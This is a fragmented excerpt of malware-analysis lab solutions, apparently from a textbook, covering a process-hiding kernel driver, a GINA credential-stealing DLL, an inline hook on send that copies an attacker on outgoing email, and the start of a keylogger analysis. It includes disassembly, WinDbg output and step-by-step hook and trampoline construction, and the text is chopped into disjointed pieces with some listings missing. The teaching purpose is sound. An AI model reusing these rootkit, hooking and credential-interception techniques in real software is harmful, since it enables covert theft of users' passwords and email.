Extract the file from the resource section of the executable file that 
installed it.
[Word Count: 15]

3.
Access the file even though it’s not available in the directory listing. 
The hook to NtQueryDirectoryFile prevents the file from being shown in 
a directory listing, but the file still exists. For example, you could copy 
the file using the DOS command copy Mlwx486.sys NewFilename.sys. The 
NewFilename.sys file would not be hidden.
[Word Count: 53]

and overwrites that entry with the address of the PatchFunction. It doesn’t create 
a device, and it doesn’t add any function handlers to the driver object.
[Word Count: 26]

1.
The user-space program loads the driver and then pops up an advertise-
ment every 30 seconds. The driver hides the process by unlinking the 
Process Environment Block (PEB) from the system’s linked list.
[Word Count: 34]

2.
Once this program is running, there is no easy way to stop it without 
rebooting.
[Word Count: 16]

3.
The kernel component responds to any DeviceIoControl request by 
unlinking the process that made the request from the linked list of 
processes in order to hide the process from the user.
[Word Count: 32]

We begin with some basic static analysis on the files. When we analyze the 
driver file, we see the following imports:
[Word Count: 21]

IofCompleteRequest
IoDeleteDevice
IoDeleteSymbolicLink
RtlInitUnicodeString
IoGetCurrentProcess
IoCreateSymbolicLink
IoCreateDevice
KeTickCount
[Word Count: 8]

choice is to revert to our most recent snapshot or reboot and hope that the 
program isn’t persistent. It’s not, so a reboot stops it.
[Word Count: 25]

Now to IDA Pro. Navigating to WinMain and examining the functions it calls, 
we see the following:
[Word Count: 17]

OpenSCManager
CreateService
StartService
CloseServiceHandle
CreateFile
DeviceIoControl
OleInitialize
CoCreateInstance
VariantInit
SysAllocString
ecx+0x2c
Sleep
OleUninitialize
[Word Count: 13]

0040108C                 lea     ecx, [esp+2Ch+BytesReturned]
00401090                 push    0               ; lpOverlapped
00401092                 push    ecx             ; lpBytesReturned
00401093                 push    0               ; nOutBufferSize
00401095                 push
0              ; lpOutBuffer
00401097                 push    0               ; nInBufferSize
00401099                 push
0              ; lpInBuffer
0040109B                 push
0ABCDEF01h     ; dwIoControlCode
004010A0                 push    eax             ; hDevice
004010A1                 call    ds:DeviceIoControl
[Word Count: 47]

Listing 10-14L: A call to DeviceIoControl in Lab10-03.exe to pass a request to the 
Lab10-03.sys driver
[Word Count: 16]

Next, we open the kernel file with IDA Pro. As shown in Listing 10-15L, we see 
that it calls IoCreateDevice at  to create a device named \Device\ProcHelper at .
[Word Count: 30]

0001071A push    offset aDeviceProchelp ; "\\Device\\ProcHelper"
0001071F  lea     eax, [ebp+var_C]
00010722  push    eax
00010723  call    edi ; RtlInitUnicodeString
00010725  mov     esi, [ebp+arg_0]
00010728  lea     eax, [ebp+var_4]
0001072B  push    eax
0001072C  push    0
0001072E  push    100h
00010733  push    22h
00010735  lea     eax, [ebp+var_C]
00010738  push    eax
00010739  push    0
0001073B  push    esi
0001073C call    ds:IoCreateDevice
[Word Count: 54]

Listing 10-15L: Lab10-03.sys creating a device that is accessible from user space
[Word Count: 12]

As shown in Listing 10-16L, the function then calls IoCreateSymbolicLink 
at  to create a symbolic link named \DosDevices\ProcHelper at  for the user-
space program to access.
[Word Count: 28]

00010751 push    offset aDosdevicesPr_0 ; "\\DosDevices\\ProcHelper"
00010756  lea     eax, [ebp+var_14]
00010759  push    eax
0001075A  mov     dword ptr [esi+70h], offset loc_10666
00010761  mov     dword ptr [esi+34h], offset loc_1062A
00010768  call    edi ; RtlInitUnicodeString
0001076A  lea     eax, [ebp+var_C]
0001076D  push    eax
0001076E  lea     eax, [ebp+var_14]
00010771  push    eax
00010772 call    ds:IoCreateSymbolicLink
[Word Count: 49]

Listing 10-16L: Lab10-03.sys creating a symbolic link to make it easier for user-space appli-
cations to access a handle to the device
[Word Count: 22]

Finding the Driver in Memory with WinDbg
[Word Count: 7]

We can either run the malware or just start the service to load our kernel driver 
into memory. We know that the device object is at \Device\ProcHelper, so we 
start with it. In order to find the function in ProcHelper that is executed, we 
must find the driver object, which can be done with the !devobj command, as 
shown in Listing 10-17L. The output of !devobj tells us where the DriverObject 
at  is stored.
[Word Count: 75]

kd> !devobj ProcHelper
Device object (82af64d0) is for:
 ProcHelper \Driver\Process Helper DriverObject 82716a98
Current Irp 00000000 RefCount 1 Type 00000022 Flags 00000040
Dacl e15b15cc DevExt 00000000 DevObjExt 82af6588 
ExtensionFlags (0000000000)  
Device queue is not busy.
[Word Count: 35]

Listing 10-17L: Finding the device object for the ProcHelper driver
[Word Count: 10]

The DriverObject contains pointers to all of the functions that will be called 
when a user-space program accesses the device object. The DriverObject is 
stored in a data structure called DRIVER_OBJECT. We can use the dt command 
to view the driver object with labels, as shown in Listing 10-18L.
[Word Count: 49]

kd> dt nt!_DRIVER_OBJECT 82716a98
   +0x000 Type             : 4
   +0x002 Size             : 168
   +0x004 DeviceObject     : 0x82af64d0 _DEVICE_OBJECT
   +0x008 Flags            : 0x12
   +0x00c DriverStart      : 0xf7c26000 
   +0x010 DriverSize       : 0xe00
   +0x014 DriverSection    : 0x827bd598 
   +0x018 DriverExtension  : 0x82716b40 _DRIVER_EXTENSION
   +0x01c DriverName       : _UNICODE_STRING "\Driver\Process Helper"
   +0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\
HARDWARE\DESCRIPTION\SYSTEM"
   +0x028 FastIoDispatch   : (null) 
   +0x02c DriverInit       : 0xf7c267cd     long  +0
   +0x030 DriverStartIo    : (null) 
   +0x034 DriverUnload     : 0xf7c2662a     void  +0
   +0x038 MajorFunction    : [28] 0xf7c26606     long  +0
[Word Count: 78]

Listing 10-18L: Examining the driver object for Lab10-03.sys using WinDbg
[Word Count: 10]

This code contains several function pointers of note. These include 
DriverInit, the DriverEntry routine we analyzed in IDA Pro, and DriverUnload, 
which is called when this driver is unloaded. When we look at DriverUnload 
in IDA Pro, we see that it deletes the symbolic link and the device created 
by the DriverEntry program.
[Word Count: 53]

Analyzing the Functions of the Major Function Table
[Word Count: 8]

Next, we examine the major function table, which is often where the most 
interesting driver code is implemented. Windows XP allows 0x1C possible 
major function codes, so we view the entries in the major function table 
using the dd command:
[Word Count: 40]

kd> dd 82716a98+0x38 L1C
82716ad0  
f7c26606 804f354a f7c26606 804f354a
82716ae0  
804f354a 804f354a 804f354a 804f354a
82716af0  
804f354a 804f354a 804f354a 804f354a
82716b00  
804f354a 804f354a f7c26666 804f354a
82716b10  
804f354a 804f354a 804f354a 804f354a
82716b20  
804f354a 804f354a 804f354a 804f354a
82716b30  
804f354a 804f354a 804f354a 804f354a
[Word Count: 39]

Each entry in the table represents a different type of request that the 
driver can handle, but as you can see, most of the entries in the table are 
for the same function at 0X804F354A. All of the entries in the table with the 
value 0X804F354A represent a request type that the driver does not handle. 
To verify this, we need to find out what that function does. We could view 
its disassembly, but because it’s a Windows function, its name should tell us 
what it does, as shown here:
[Word Count: 90]

kd> ln 804f354a 
(804f354a)   nt!IopInvalidDeviceRequest   |  (804f3580)   
nt!IopGetDeviceAttachmentBase
Exact matches:
    nt!IopInvalidDeviceRequest = <no type information>
[Word Count: 15]

00010666                 mov     edi, edi
00010668                 push    ebp
00010669                 mov     ebp, esp
[Word Count: 11]

0001066B                 call   ds:IoGetCurrentProcess
00010671                 mov     ecx, [eax+8Ch]
00010677                 add    eax, 88h
0001067C                 mov     edx, [eax]
0001067E                 mov     [ecx], edx
00010680                 mov     ecx, [eax]
00010682                 mov    eax, [eax+4]
00010685                 mov     [ecx+4], eax
00010688                 mov     ecx, [ebp+Irp]  ; Irp
0001068B                 and     dword ptr [ecx+18h], 0
0001068F                 and     dword ptr [ecx+1Ch], 0
00010693                 xor     dl, dl          ; PriorityBoost
00010695                 call    ds:IofCompleteRequest
0001069B                 xor     eax, eax
0001069D                 pop     ebp
0001069E                 retn    8
[Word Count: 68]

Listing 10-19L: The driver code that handles DeviceIoControl requests
[Word Count: 9]

The first thing the DeviceIoControl function does is call IoGetCurrentProcess 
at , which returns the EPROCESS structure of the process that issued the call 
to DeviceIoControl. The function then accesses the data at an offset of 0x88 
at , and then accesses the next DWORD at offset 0x8C at .
We use the dt command to discover that LIST_ENTRY is stored at offsets 
0x88 and 0x8C in the PEB structure, as shown in Listing 10-20L at .
[Word Count: 77]

kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x06c ProcessLock      : _EX_PUSH_LOCK
   +0x070 CreateTime       : _LARGE_INTEGER
   +0x078 ExitTime         : _LARGE_INTEGER
   +0x080 RundownProtect   : _EX_RUNDOWN_REF
   +0x084 UniqueProcessId  : Ptr32 Void
+0x088 ActiveProcessLinks : _LIST_ENTRY
   +0x090 QuotaUsage       : [3] Uint4B
   +0x09c QuotaPeak        : [3] Uint4B
...
[Word Count: 43]

Listing 10-20L: Examining the EPROCESS structure with WinDbg
[Word Count: 8]

Now that we know that function is accessing the LIST_ENTRY structure, we 
look closely at how LIST_ENTRY is being accessed. The LIST_ENTRY structure is a 
double-linked list with two values: the first is BLINK, which points to the previ-
ous entry in the list, and the second is FLINK, which points to the next entry in 
the list. We see that it is not only reading the LIST_ENTRY structure, but also 
changing structures, as shown in Listing 10-21L.
[Word Count: 78]

00010671
mov     ecx, [eax+8Ch]
00010677                 add     eax, 88h
0001067C
mov     edx, [eax]
0001067E
mov     [ecx], edx
00010680
mov     ecx, [eax]
[Word Count: 20]

00010682
mov     eax, [eax+4]
00010685
mov     [ecx+4], eax
[Word Count: 8]

Listing 10-21L: DeviceIoControl code that modifies the EPROCESS structure
[Word Count: 9]

Figure 10-3L: A process being removed from the process list so that it’s hidden from tools 
such as Task Manager
[Word Count: 20]

1.
The malware extracts and drops the file msgina32.dll onto disk from a 
resource section named TGAD.
[Word Count: 17]

2.
The malware installs msgina32.dll as a GINA DLL by adding it to the reg-
istry location HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
GinaDLL, which causes the DLL to be loaded after system reboot.
[Word Count: 30]

LIST_ENTRY
LIST_ENTRY
LIST_ENTRY
LIST_ENTRY
[Word Count: 4]

3.
The malware steals user credentials by performing GINA interception. The 
msgina32.dll file is able to intercept all user credentials submitted to the 
system for authentication.
[Word Count: 26]

4.
The malware logs stolen credentials to %SystemRoot%\System32\
msutil32.sys. The username, domain, and password are logged to the 
file with a timestamp.
[Word Count: 22]

5.
Once the malware is dropped and installed, there must be a system 
reboot for the GINA interception to begin. The malware logs credentials 
only when the user logs out, so log out and back in to see your creden-
tials in the log file.
[Word Count: 45]

Beginning with basic static analysis, we see the strings GinaDLL and SOFTWARE\
Microsoft\Windows NT\CurrentVersion\Winlogon, which lead us to suspect that this 
might be GINA interception malware. Examining the imports, we see func-
tions for manipulating the registry and extracting a resource section. Because 
we see resource extraction import functions, we examine the file structure by 
loading Lab11-01.exe into PEview, as shown in Figure 11-1L.
[Word Count: 64]

Figure 11-1L: Lab11-01.exe in PEview showing the TGAD resource section
[Word Count: 10]

conclude that Lab11-01.exe is an installer for msgina32.dll, which is loaded 
by Winlogon during system startup.
[Word Count: 16]

We’ll begin our analysis of msgina32.dll by looking at the Strings output, as 
shown in Listing 11-1L.
[Word Count: 17]

GinaDLL
Software\Microsoft\Windows NT\CurrentVersion\Winlogon
MSGina.dll
UN %s DM %s PW %s OLD %s 
msutil32.sys
[Word Count: 14]

Listing 11-1L: Strings output of msgina32.dll
[Word Count: 6]

1000105A         cmp     eax, DLL_PROCESS_ATTACH 
1000105D         jnz     short loc_100010B7
...
1000107E         call    ds:GetSystemDirectoryW 
10001084         lea     ecx, [esp+20Ch+LibFileName]
10001088         push    offset String2          ; "\\MSGina"
1000108D         push    ecx                     ; lpString1
1000108E         call    ds:lstrcatW
10001094         lea     edx, [esp+20Ch+LibFileName]
10001098         push    edx                     ; lpLibFileName
10001099         call    ds:LoadLibraryW 
1000109F         xor     ecx, ecx
100010A1         mov     hModule, eax 
[Word Count: 54]

Listing 11-2L: DllMain of msgina32.dll getting a handle to msgina.dll
[Word Count: 10]

As shown in the Listing 11-2L, DllMain first checks the fdwReason argument 
at . This is an argument passed in to indicate why the DLL entry-point 
function is being called. The malware checks for DLL_PROCESS_ATTACH, which is 
called when a process is starting up or when LoadLibrary is used to load the 
DLL. If this particular DllMain is called during a DLL_PROCESS_ATTACH, the code 
beginning at  is called. This code gets a handle to msgina.dll in the Win-
dows system directory via the call to LoadLibraryW at .
[Word Count: 89]

NOTE
msgina.dll is the Windows DLL that implements GINA, whereas msgina32.dll is the 
malware author’s GINA interception DLL. The name msgina32 is designed to deceive.
[Word Count: 25]

The malware saves the handle in a global variable that IDA Pro has named 
hModule at . The use of this variable allows the DLL’s exports to properly call 
functions in the msgina.dll Windows DLL. Since msgina32.dll is intercepting 
communication between Winlogon and msgina.dll, it must properly call the 
functions in msgina.dll so that the system will continue to operate normally. 
Next, we analyze each export function. We begin with WlxLoggedOnSAS, as 
shown in Listing 11-3L.
[Word Count: 76]

10001350 WlxLoggedOnSAS proc near
10001350         push    offset aWlxloggedons_0  ; "WlxLoggedOnSAS"
10001355         call    sub_10001000
1000135A         jmp     eax 
[Word Count: 17]

Listing 11-3L: WlxLoggedOnSAS export just passing through to msgina.dll
[Word Count: 9]

100014FC         push    offset aUnSDmSPwSOldS  ; "UN %s DM %s PW %s OLD %s"
10001501         push    0                        ; dwMessageId
10001503         call    sub_10001570 
[Word Count: 23]

Listing 11-4L: WlxLoggedOutSAS calling the credential logging function sub_10001570
[Word Count: 9]

The code in Listing 11-4L passes a bunch of arguments and a format 
string at . This string is passed to sub_10001570, which is called at .
[Word Count: 27]

It seems like sub_10001570 may be the logging function for stolen creden-
tials, so let’s examine it to see what it does. Listing 11-5L shows the logging 
code contained in sub_10001570.
[Word Count: 31]

Listing 11-5L: The credential-logging function logging to msutil32.sys
[Word Count: 8]

09/10/11 15:00:04 - UN user DM MALWAREVM PW test123 OLD (null) 
09/10/11 23:09:44 - UN hacker DM MALWAREVM PW p@ssword OLD (null)
[Word Count: 22]

The usernames are user and hacker, their passwords are test123 and 
p@ssword, and the domain is MALWAREVM.
[Word Count: 17]

Lab 11-1 is a GINA interceptor installer. The malware drops a DLL on the 
system and installs it to steal user credentials, beginning after system reboot. 
Once the GINA interceptor DLL is installed and running, it logs credentials 
to msutil32.sys when a user logs out of the system.
[Word Count: 48]

1.
Lab11-02.dll contains one export, named installer.
[Word Count: 7]

2.
If you run the malware from the command line using rundll32.exe 
Lab11-02.dll,installer, the malware copies itself to the Windows system 
directory as spoolvxx32.dll and installs itself persistently under AppInit_DLLs. 
The malware also tries to open Lab11-02.ini from the Windows system 
directory, but it doesn’t find it there.
[Word Count: 48]

3.
Lab11-02.ini must reside in %SystemRoot%\System32\ in order for the mal-
ware to run properly.
[Word Count: 15]

4.
The malware installs itself in the AppInit_DLLs registry value, which causes 
the malware to be loaded into every process that also loads User32.dll.
[Word Count: 24]

5.
This malware installs an inline hook of the send function.
[Word Count: 11]

6.
The hook checks if the outgoing packet is an email message containing 
RCPT TO:, and if this string is found, it adds an additional RCPT TO line con-
taining a malicious email account.
[Word Count: 34]

7.
The malware targets only MSIMN.exe, THEBAT.exe, and OUTLOOK.exe 
because all are email clients. The malware does not install the hook 
unless it is running inside one of these processes.
[Word Count: 30]

8.
The INI file contains an encrypted email address. After decrypting 
Lab11-02.ini, we see it contains billy@malwareanalysisbook.com.
[Word Count: 17]

9.
See “Capturing the Network Traffic” on page 580 for our method of cap-
turing data using Wireshark, a fake mail server, and Outlook Express.
[Word Count: 25]

We begin with basic static analysis of Lab11-02.dll. The DLL has only one 
export, named installer. The malware contains imports for manipulating 
the registry (RegSetValueEx), changing the file system (CopyFile), and search-
ing through a process or thread listing (CreateToolhelp32Snapshot). The inter-
esting strings for Lab11-02.dll are shown in Listing 11-6L.
[Word Count: 51]

RCPT TO: <
THEBAT.EXE
OUTLOOK.EXE
MSIMN.EXE
send
[Word Count: 7]

wsock32.dll
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
spoolvxx32.dll
AppInit_DLLs
\Lab11-02.ini
[Word Count: 6]

Listing 11-6L: Interesting strings in Lab11-02.dll
[Word Count: 6]

The strings AppInit_DLLs and SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Windows indicate that the malware might use AppInit_DLLs to install itself for 
persistence. The string \Lab11-02.ini indicates that the malware uses the INI 
file provided in this lab. 
Examining the contents of Lab11-02.ini, we see that it appears to contain 
encoded or encrypted data. The send and wsock32.dll strings may indicate 
that the malware uses networking functionality, but that is unclear until we 
dig deeper. The process names (OUTLOOK.EXE, MSIMN.EXE, and THEBAT.EXE) are 
email clients, and combining those strings with RCPT TO: leads us to suspect 
that this malware does something with email.
[Word Count: 99]

NOTE
RCPT is an SMTP command to establish a recipient for an email message.
[Word Count: 14]

Next, we use basic dynamic tools like procmon to monitor the malware. 
We begin by trying to install the malware using the installer export with the 
following command:
[Word Count: 28]

Figure 11-2L: Cross-reference graph of the installer export
[Word Count: 8]

As you can see, installer sets a value in the registry and copies a file to 
the Windows system directory. This matches what we saw during dynamic 
analysis and is confirmed in the disassembly. The installer function’s only 
purpose is to copy the malware to spoolvxx32.dll and set it as an AppInit_DLLs 
value.
In Listing 11-7L, we focus on DllMain, which starts by checking for 
DLL_PROCESS_ATTACH, as with the previous lab. It appears that this malware 
runs only during DLL_PROCESS_ATTACH; otherwise, DllMain returns without 
doing anything else.
[Word Count: 87]

1000161E         cmp     [ebp+fdwReason], DLL_PROCESS_ATTACH
...
10001651         call    _GetWindowsSystemDirectory 
10001656         mov     [ebp+lpFileName], eax
10001659         push    104h                    ; Count
1000165E         push    offset aLab1102_ini     ; \\Lab11-02.ini 
10001663         mov     edx, [ebp+lpFileName]
10001666         push    edx                     ; Dest
10001667         call    strncat 
1000166C         add     esp, 0Ch
1000166F         push    0                       ; hTemplateFile
10001671         push    FILE_ATTRIBUTE_NORMAL   ; dwFlagsAndAttributes
10001676         push    OPEN_EXISTING           ; dwCreationDisposition
10001678         push    0                       ; lpSecurityAttributes
1000167A         push    FILE_SHARE_READ         ; dwShareMode
1000167C         push    GENERIC_READ            ; dwDesiredAccess
10001681         mov     eax, [ebp+lpFileName]
10001684         push    eax                     ; lpFileName
10001685         call    ds:CreateFileA 
[Word Count: 85]

Listing 11-7L: Code in DllMain that attempts to open Lab11-02.ini from the system directory
[Word Count: 14]

In Listing 11-7L at , we see the Windows system directory retrieved, as 
well as the string for Lab11-02.ini at . Together, these form a path with the 
strncat at . The malware attempts to open the INI file for reading at . If 
the file cannot be opened, DllMain returns. 
If the malware successfully opens the INI file, it reads the file into a 
global buffer, as shown in Listing 11-8L at .
[Word Count: 74]

100016A6         push    offset byte_100034A0  ; lpBuffer
100016AB         mov     edx, [ebp+hObject]
100016AE         push    edx                     ; hFile
100016AF         call    ds:ReadFile
100016B5         cmp     [ebp+NumberOfBytesRead], 0 
100016B9         jbe     short loc_100016D2
100016BB         mov     eax, [ebp+NumberOfBytesRead]
100016BE         mov     byte_100034A0[eax], 0
100016C5         push    offset byte_100034A0 
100016CA         call    sub_100010B3
[Word Count: 44]

Listing 11-8L: Reading and decrypting the INI file
[Word Count: 8]

Figure 11-3L: OllyDbg showing the decoded contents of Lab11-02.ini
[Word Count: 9]

At  in Figure 11-3L, the decrypted content—the email address billy@
malwareanalysisbook.com—is pointed to by EAX. This email address is stored in 
the global variable byte_100034A0, which we rename email_address in IDA Pro 
to aid future analysis.
We have one last function to analyze inside DllMain: sub_100014B6. Because 
this function will install an inline hook, we’ll rename it hook_installer. The 
hook_installer function is complicated, so before diving into it, we provide a 
high-level overview of what this inline hook looks like after installation in 
Figure 11-4L.
[Word Count: 86]

Figure 11-4L: The send function before and after a hook is installed
[Word Count: 12]

Before hook_installer installs the hook, it checks to see which process the 
malware is running in. To do so, it calls three functions to get the current 
process name. Listing 11-9L contains code from the first of these functions, 
sub_10001075.
[Word Count: 40]

1000107D         push    offset Filename         ; lpFilename
10001082         mov     eax, [ebp+hModule]
10001085         push    eax                     ; hModule
10001086         call    ds:GetModuleFileNameA 
1000108C         mov     ecx, [ebp+arg_4]   
1000108F         mov     dword ptr [ecx], offset Filename
[Word Count: 30]

Listing 11-9L: Calling GetModuleFileNameA to get the current process name
[Word Count: 10]

As you can see, GetModuleFileNameA is called at , and it returns the full 
path to the process in which the DLL is loaded because the argument hModule 
is set to 0 before the call to this function. Next, the malware returns the 
name in arg_4 (the string pointer passed to the function). This string is 
passed to two more functions, which parse the filename and change all of 
its characters to uppercase.
[Word Count: 73]

NOTE
Malware that uses AppInit_DLLs as a persistence mechanism commonly uses 
GetModuleFileNameA. This malicious DLL is loaded into just about every process 
that starts on the system. Because malware authors may want to target only certain 
processes, they must determine the name of the process in which their malicious code is 
running.
[Word Count: 52]

Next, the current process name in uppercase letters is compared to the 
process names THEBAT.EXE, OUTLOOK.EXE, and MSIMN.EXE. If the string does not 
equal one of these filenames, the malware will exit. However, if the malware 
has been loaded into one of these three processes, the malicious code seen 
in Listing 11-10L will execute.
[Word Count: 54]

10001561         call    sub_100013BD 
10001566         push    offset dword_10003484   ; int
1000156B         push    offset sub_1000113D 
; int
10001570         push    offset aSend            ; "send"
10001575         push    offset aWsock32_dll     ; "wsock32.dll"
1000157A         call    sub_100012A3 
1000157F         add     esp, 10h
10001582         call    sub_10001499 
[Word Count: 40]

Listing 11-10L: Malicious code that sets an inline hook
[Word Count: 9]

Listing 11-10L has several functions for us to analyze. Inside , we 
see calls to GetCurrentProcessId and then sub_100012FE, which we rename to 
suspend_threads. The suspend_threads function calls GetCurrentThreadId, which 
returns a thread identifier (TID) of the current thread of execution. Next, 
suspend_threads calls CreateToolhelp32Snapshot and uses the result to loop
[Word Count: 51]

100012A3 sub_100012A3 proc near
100012A3
100012A3 lpAddress= dword ptr -8
100012A3 hModule = dword ptr -4
100012A3 wsock32_DLL= dword ptr  8 
100012A3 send_function= dword ptr  0Ch
100012A3 p_sub_1000113D= dword ptr  10h
100012A3 p_dword_10003484= dword ptr  14h
100012A3
100012A3         push    ebp
100012A4         mov     ebp, esp
100012A6         sub     esp, 8
100012A9         mov     eax, [ebp+wsock32_DLL]
100012AC         push    eax                     ; lpModuleName
100012AD         call    ds:GetModuleHandleA 
...
100012CF         mov     edx, [ebp+send_function]
100012D2         push    edx                     ; lpProcName
100012D3         mov     eax, [ebp+hModule]
100012D6         push    eax                     ; hModule
100012D7         call    ds:GetProcAddress 
100012DD         mov     [ebp+lpAddress], eax
[Word Count: 89]

Listing 11-11L: sub_100012A3 resolving the send function
[Word Count: 7]

In Listing 11-11L, we see a handle to wsock32.dll obtained using 
GetModuleHandleA at . That handle is passed to GetProcAddress to resolve the 
send function at . The malware ends up passing the address of the send 
function and the two other parameters (sub_1000113D and dword_10003484) to 
sub_10001203, which we renamed place_hook. 
Now, we examine place_hook and rename the arguments accordingly in 
order to aid our analysis. Listing 11-12L shows the start of place_hook.
[Word Count: 74]

10001209         mov     eax, [ebp+_sub_1000113D]
1000120C         sub     eax, [ebp+send_address]
1000120F         sub     eax, 5
10001212         mov     [ebp+var_4], eax 
[Word Count: 17]

Listing 11-12L: Address calculation for the jump instruction
[Word Count: 8]

The code in Listing 11-12L calculates the difference between the mem-
ory address of the send function and the start of sub_1000113D. This difference 
has an additional 5 bytes subtracted from it before being moved into var_4 
at . var_4 is used later in the code and prepended with 0xE9 (the opcode for 
jmp), making this a 5-byte instruction to jump to sub_1000113D. 
Let’s see how the malware installs this code as a hook later in place_hook. 
The start of the send function is modified by the instructions shown in 
Listing 11-13L.
[Word Count: 92]

10001271         mov     edx, [ebp+send_address]
10001274         mov     byte ptr [edx], 0E9h 
10001277         mov     eax, [ebp+send_address]
1000127A         mov     ecx, [ebp+var_4]
1000127D         mov     [eax+1], ecx 
[Word Count: 24]

Listing 11-13L: The inline hook installation
[Word Count: 6]

At , the code copies the 0xE9 opcode into the start of the send function. 
Following that, it copies var_4 into memory just after the 0xE9 at . Recall from 
Listing 11-12L that var_4 contains the destination of the jump, sub_1000113D. 
The code in Listing 11-13L places a jmp instruction at the beginning of the 
send function that jumps to the function in our DLL at sub_1000113D, which 
we’ll now rename hook_function. 
Before we examine hook_function, let’s wrap up our analysis of the inline 
hook installation. Listing 11-14L shows place_hook manipulating memory.
[Word Count: 92]

10001218         push    ecx                     ; lpflOldProtect
10001219         push    PAGE_EXECUTE_READWRITE  ; flNewProtect 
1000121B         push    5                       ; dwSize
1000121D         mov     edx, [ebp+send_address]
10001220         push    edx                     ; lpAddress
10001221         call    ds:VirtualProtect 
10001227         push    0FFh                    ; Size
1000122C         call    malloc
10001231         add     esp, 4
10001234         mov     [ebp+var_8], eax 
[Word Count: 45]

Listing 11-14L: place_hook (sub_10001203) manipulating memory
[Word Count: 6]

In Listing 11-14L, place_hook calls VirtualProtect at  on the start of the 
send function code. This action changes the memory protection to execute, 
read, and write access, thereby allowing the malware to modify the instruc-
tions of the send function. Another call to VirtualProtect at the end of the
[Word Count: 50]

function restores the original memory-protection settings. Then, immedi-
ately after calling VirtualProtect, the malware allocates 0xFF bytes of memory 
using malloc and stores the result in var_8 at . Because this dynamically allo-
cated memory will play an important role in the installation of our hook as a 
trampoline, we’ll rename var_8 to trampoline.
[Word Count: 54]

NOTE
In order for this to execute properly, the memory returned by the call to malloc must be 
executable memory, which might not always be the case if, for example, Data Execution 
Prevention (DEP) is enabled via /Noexecute=alwayson or similar.
[Word Count: 40]

Listing 11-15L shows the creation of the trampoline’s code.
[Word Count: 9]

10001246         push    5                       ; Size
10001248         mov     eax, [ebp+send_address]
1000124B         push    eax                     ; Src
1000124C         mov     ecx, [ebp+trampoline]
1000124F         add     ecx, 5
10001252         push    ecx                     ; Dst
10001253         call    memcpy 
10001258         add     esp, 0Ch
1000125B         mov     edx, [ebp+trampoline]
1000125E         mov     byte ptr [edx+0Ah], 0E9h 
10001262         mov     eax, [ebp+send_address]
10001265         sub     eax, [ebp+trampoline]
10001268         sub     eax, 0Ah
1000126B         mov     ecx, [ebp+trampoline]
1000126E         mov     [ecx+0Bh], eax 
[Word Count: 67]

Listing 11-15L: Trampoline creation for the inline hook
[Word Count: 8]

int __stdcall hook_function(SOCKET s, char * buf, int len, int flags)
[Word Count: 11]

The hook function looks for the string RCPT TO: in buf. If the string isn’t 
found, the malware just calls trampoline_function, which causes send to operate 
as it did before the hook was installed. Otherwise, the code in Listing 11-16L 
will execute.
[Word Count: 42]

1000116D         push    offset aRcptTo_1        ; "RCPT TO: <" 
10001172         lea     ecx, [ebp+Dst]
10001178         push    ecx                     ; Dst
10001179         call    memcpy
...
10001186         push    offset email_address    ; Src 
...
10001198         lea     edx, [ebp+eax+Dst]
1000119F         push    edx                     ; Dst
100011A0         call    memcpy
100011A8         push    offset Source           ; ">\r\n" 
100011AD         lea     eax, [ebp+Dst]
100011B3         push    eax                     ; Dest
100011B4         call    strcat
[Word Count: 61]

Listing 11-16L: Creating the string to add a recipient
[Word Count: 9]

The code in Listing 11-16L builds a string that is added to the outgoing 
buffer. This string starts with RCPT TO: < at , followed by email_address at , 
and ends with >\r\n at . The email_address value in this case is billy@
malwareanalysisbook.com (extracted from Lab11-02.ini, as explained earlier 
when we looked at the contents of that file). This code adds a recipient to 
all outgoing email messages.
[Word Count: 69]

Here’s a summary of the hook’s operation (also illustrated at a high-level in 
Figure 11-4L, shown earlier):
[Word Count: 17]


The first instruction of the send function transfers execution to 
sub_1000113D.
[Word Count: 12]


sub_1000113D manipulates the outgoing buffer only if it contains a RCPT TO 
string.
[Word Count: 14]


sub_1000113D calls the trampoline code located on the heap and pointed 
to by dword_10003484.
[Word Count: 15]


The trampoline code executes the first three original instructions of the 
send function (which it overwrote to install the hook).
[Word Count: 21]


The trampoline code jumps back to the send function 5 bytes in, so that 
send can function normally.
[Word Count: 19]

We can examine the inline hook using OllyDbg by installing the malware 
and then launching Outlook Express. (Outlook Express is bundled with 
Microsoft Windows XP and runs as msimn.exe.) We attach to the process using
[Word Count: 35]

FileAttach and selecting msimn.exe from the process listing. Attaching to a 
process immediately pauses all of the threads. If we examine the memory 
map, we see that spoolvxx32.dll is loaded in the process because it is an 
AppInit_DLLs value.
Next, we examine send by pressing CTRL-G and entering send in the text 
box. Figure 11-5L shows the start of the send function with the jmp hook to 
sub_1000113D. (If you like, you can set a breakpoint at this jump and analyze 
the code during runtime.)
[Word Count: 85]

Figure 11-5L: Examining the inline hook for the send 
function in msimn.exe
[Word Count: 12]

To capture this malware in action and see how it manipulates network traffic, 
set up a safe environment as follows:
[Word Count: 20]

1.
Turn on host-only networking in your virtual machine.
[Word Count: 9]

2.
Install the malware on your virtual machine with the command 
rundll32.exe Lab11-02.exe,installer.
[Word Count: 13]

3.
Copy Lab11-02.ini into C:\Windows\System32\.
[Word Count: 5]

4.
Launch Wireshark and start capturing packets on the virtual machine 
network interface.
[Word Count: 13]

5.
Set up Outlook Express to send email to the host system.
[Word Count: 12]

6.
Run a fake mail server on your host machine with the command python 
-m smtpd -n -c DebuggingServer IP:25, where IP is the IP address of the host 
machine.
[Word Count: 30]

8.
Review the packet capture in Wireshark and select Follow TCP Stream 
on the email message.
[Word Count: 16]

searches for RCPT TO. If the malware finds the RCPT TO string, it inserts an addi-
tional RCPT TO containing an email address retrieved by decoding Lab11-02.ini, 
essentially copying the malware author on every email sent from the targeted 
email programs.
[Word Count: 41]

1.
Lab11-03.exe contains the strings inet_epar32.dll and net start cisvc, which 
means that it probably starts the CiSvc indexing service. Lab11-03.dll con-
tains the string C:\WINDOWS\System32\kernel64x.dll and imports the API calls 
GetAsyncKeyState and GetForegroundWindow, which makes us suspect it is a key-
logger that logs to kernel64x.dll.
[Word Count: 47]

2.
The malware starts by copying Lab11-03.dll to inet_epar32.dll in the Win-
dows system directory. The malware writes data to cisvc.exe and starts the 
indexing service. The malware also appears to write keystrokes to C:\
Windows\System32\kernel64x.dll.
[Word Count: 36]

3.
The malware persistently installs Lab11-03.dll by trojanizing the indexing 
service by entry-point redirection. It redirects the entry point to run 
